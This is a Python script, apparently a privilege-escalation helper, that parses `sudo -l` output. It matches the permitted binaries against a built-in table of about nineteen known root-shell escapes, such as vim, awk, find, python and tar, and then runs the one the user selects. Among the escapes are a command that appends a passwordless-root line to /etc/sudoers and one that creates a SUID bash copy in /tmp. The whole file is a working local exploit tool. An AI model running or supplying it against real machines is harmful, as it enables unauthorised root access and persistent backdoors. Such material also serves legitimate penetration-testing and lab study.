import os
import sys
import subprocess
import pwd

def run(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except:
        return "", "error", -1

def banner():
    print("="*60)
    print("  SUDO PRIVILEGE ESCALATION CHECK")
    print("="*60)
    user = pwd.getpwuid(os.getuid()).pw_name
    print(f"  Current user: {user}")
    print(f"  UID: {os.getuid()}")
    print("="*60)

def check_sudo():
    """Run sudo -l to see what the user can run as root."""
    out, err, code = run("sudo -n -l 2>&1")
    if "password" in err.lower():
        print("[!] Password required for sudo. Trying with -l...")
        out, err, code = run("echo '' | sudo -S -l 2>&1")
    print("\n[+] Sudo permissions:\n")
    print(out if out else "  None found or password required")
    return out

def get_exploits(sudo_out):
    """Match sudo entries against known GTFO bin escapes."""
    escapes = {
        "vim": "sudo vim -c ':!/bin/bash'",
        "vi": "sudo vi -c ':!/bin/bash'",
        "nano": "sudo nano -s /bin/bash",
        "less": "sudo less /etc/hosts\n  !/bin/bash",
        "more": "sudo more /etc/hosts\n  !/bin/bash",
        "man": "sudo man man\n  !/bin/bash",
        "awk": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
        "find": "sudo find . -exec /bin/bash \\; -quit",
        "python": "sudo python -c 'import os; os.system(\"/bin/bash\")'",
        "python3": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
        "perl": "sudo perl -e 'exec \"/bin/bash\";'",
        "ruby": "sudo ruby -e 'exec \"/bin/bash\"'",
        "lua": "sudo lua -e 'os.execute(\"/bin/bash\")'",
        "tcpdump": "sudo tcpdump -i lo -w /dev/null -W 1 -G 1 -z /bin/bash",
        "git": "sudo git -p help\n  !/bin/bash",
        "tar": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
        "zip": "sudo zip /tmp/x.zip /etc/hosts -T --unzip-command='sh -c /bin/bash'",
        "tee": "echo 'user ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers",
        "cp": "# Create a suid bash copy:\nsudo cp /bin/bash /tmp/rootshell && sudo chmod +s /tmp/rootshell && /tmp/rootshell -p",
    }
    
    matches = []
    for cmd, exploit in escapes.items():
        if cmd in sudo_out.lower():
            matches.append((cmd, exploit))
    return matches

def main():
    banner()
    out = check_sudo()
    
    if "not allowed to run sudo" in out.lower():
        print("\n[-] User is not in sudoers. Try other vectors.")
        return
    
    matches = get_exploits(out)
    
    if matches:
        print("\n[+] Potential sudo exploits found:\n")
        for i, (cmd, exploit) in enumerate(matches, 1):
            print(f"  [{i}] {cmd}")
            print(f"      Run: {exploit}")
            print()
        print("  [0] Quit")
        
        try:
            choice = input("\nSelect exploit to run: ")
            idx = int(choice) - 1
            if 0 <= idx < len(matches):
                cmd = matches[idx][1].split("\n")[0].strip()
                print(f"\n[+] Running: {cmd}\n")
                os.system(cmd)
        except:
            pass
    else:
        print("\n[-] No common sudo escape patterns found.")
        print("[*] Check the raw sudo -l output above manually.")
        print("[*] Try: https://gtfobins.github.io/")

if __name__ == "__main__":
    main()
